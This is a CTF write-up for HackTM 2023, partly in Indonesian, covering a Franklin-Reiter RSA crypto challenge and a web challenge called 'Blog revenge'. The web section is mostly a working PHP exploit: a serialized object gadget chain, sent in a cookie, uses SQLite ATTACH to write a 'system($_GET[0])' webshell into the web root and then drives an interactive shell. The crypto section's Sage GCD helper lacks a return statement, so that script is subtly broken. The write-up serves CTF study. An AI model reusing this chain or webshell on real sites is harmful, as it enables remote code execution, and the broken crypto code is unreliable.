# Crypto - d-phi-enc

Franklin Reiter's attack on related messages.

source: https://github.com/ashutosh1206/Crypton/blob/master/RSA-encryption/Attack-Franklin-Reiter/README.md

Ketika 2 pesan berbeda dienkripsi dengan nilai e dan modulus N yang sama, akan tetapi pesan tersebut saling berkaitan, misalnya:

```
c1 = m^e % N
c2 = (m+constant)^e % N
```

Pada soal ini diketahui masing-masing persamaan berikut

```
enc_d = ((1-k*phi)/e)^3 % N
enc_phi = (phi)^3 % N
```

Berdasarkan uji coba yang saya lakukan ketika mencari nilai d dengan e=3, didapatkan nilai k yang relatif kecil yaitu antara 1 sampai 3, tapi kebanyakan yang saya temui adalah 2, oleh karena itu saya coba dengan nilai k=2, berikut script yang digunakan:

from: https://github.com/ashutosh1206/Crypton/blob/master/RSA-encryption/Attack-Franklin-Reiter/exploit.sage

```python
def GCD(a, b):
    while b:
        a,b = b, a % b
    a.monic()
def franklinreiter(C1, C2, e, N):
    P.<phi> = PolynomialRing(Zmod(N))
    f1 = ((1+2*phi)//e)^e - C1
    f2 = phi^e - C2
    return -GCD(f1, f2).coefficients()[0]
phi = franklinreiter(enc_d, enc_phi, 3, n)
d = pow(3, -1, phi)
flag = hex(pow(enc_flag, d, N))[2:]
print(bytes.fromhex(flag)) #b"HackTM{Have you warmed up? If not, I suggest you consider the case where e=65537, although I don't know if it's solvable. Why did I say that? Because I have to make this flag much longer to avoid solving it just by calculating the cubic root of enc_flag.}"
```

Write up crypto dari probset [https://github.com/y011d4/my-ctf-challenges/tree/main/2023-HackTMCTF-2023/crypto](https://github.com/y011d4/my-ctf-challenges/tree/main/2023-HackTMCTF-2023/crypto "https://github.com/y011d4/my-ctf-challenges/tree/main/2023-HackTMCTF-2023/crypto")

# WEB - Blog revenge

 Blog revenge solver
 
 ```php
<?php

include("util.php");

$GLOBALS["BLOG_REVENGE"] = "http://34.141.16.87:30001";

function request($payload)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $GLOBALS["BLOG_REVENGE"] . "/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: user=$payload"));
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function register($creds)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $GLOBALS["BLOG_REVENGE"] . "/register.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "username=$creds&password=$creds");
    curl_exec($ch);
    curl_close($ch);
}

function shell(string $webshell)
{
    while (true) {
        $input = urlencode(readline("$ "));
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $GLOBALS["BLOG_REVENGE"] . "/images/$webshell?0=$input");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        echo $response."\n";
    }
    curl_close($ch);
}

$webshell = "asdwiqdpomqwdpo.php";

$conn = new Conn;
$conn->queries = array(
    new Query("ATTACH DATABASE '/var/www/html/images/$webshell' AS jctf;", array()),
    new Query("CREATE TABLE jctf.pwn (dataz text);", array()),
    new Query('INSERT INTO jctf.pwn (dataz) VALUES ("<?= system($_GET[0]); ?>");', array())
);

$username = "a";
$myobj = new User($username);
$myobj->profile = new Query("", "");
$myobj->profile->query_string = new User("");
$myobj->profile->query_string->profile = $conn;


$payload = base64_encode(serialize($myobj));
register($username);

$response = request($payload);
// echo $response;

shell($webshell);
```


## External writeup

[https://github.com/daffainfo/ctf-writeup/tree/main/HackTM%202023](https://github.com/daffainfo/ctf-writeup/tree/main/HackTM%202023 "https://github.com/daffainfo/ctf-writeup/tree/main/HackTM%202023")

- web/Blog

By: daffainfo
